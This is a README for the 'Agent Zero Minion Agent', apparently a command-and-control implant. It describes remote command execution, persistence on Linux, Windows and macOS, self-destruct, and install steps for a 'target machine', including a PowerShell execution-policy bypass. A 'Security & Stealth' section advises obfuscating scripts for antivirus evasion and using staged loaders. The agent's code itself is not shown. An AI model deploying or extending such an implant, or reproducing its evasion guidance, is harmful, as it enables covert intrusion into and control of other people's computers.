# Agent Zero Minion Agent

## Overview
This package contains the Agent Zero Minion Agent: a cross-platform, remote-controlled agent for automated command execution, logging, and C2 operations. Supports Linux, Windows, and macOS with auto-install and persistence.

## Features
- Outbound TLS connection to Agent Zero server (WebSocket/gRPC)
- Secure authentication (token/cert)
- Command polling, execution, and result return
- Local and remote logging
- Auto-update and self-destruct
- Persistence via systemd (Linux), schtasks/registry (Windows), launchd (macOS)
- Web GUI for minion status and control

## Directory Structure
```
minion_agent_pack/
├── minion.py                # Main agent code (Python)
├── config.sample.json       # Sample config (edit for your deployment)
├── installers/
│   ├── install_linux.sh     # Bash installer for Linux/macOS
│   └── install_windows.ps1  # PowerShell installer for Windows
├── README.md                # This file
└── HOWTO.md                 # Step-by-step deployment guide
```

## Quick Start
1. **Edit `config.sample.json`**
   - Set your Agent Zero server URL and token.
   - Save as `minion_config.json` in the home directory of the target user.

2. **Linux/macOS Install**
   - Copy `minion.py` and `installers/install_linux.sh` to the target machine.
   - Run: `bash installers/install_linux.sh`

3. **Windows Install**
   - Copy `minion.exe` (compiled from `minion.py`) and `installers/install_windows.ps1` to the target machine.
   - Run: `powershell -ExecutionPolicy Bypass -File installers/install_windows.ps1`

4. **Check Web GUI**
   - Log in to your Agent Zero Web UI to see minion status and send commands.

## Requirements
- Python 3.x (Linux/macOS)
- websocket-client Python package (`pip install websocket-client`)
- Windows: Python or pre-compiled EXE (use PyInstaller)

## Security & Stealth
- Obfuscate/encode scripts for AV evasion
- Use staged loaders for MCPs if needed
- Test in VMs before live deployment

## Support
For issues, feature requests, or custom builds, contact your Agent Zero overlord.
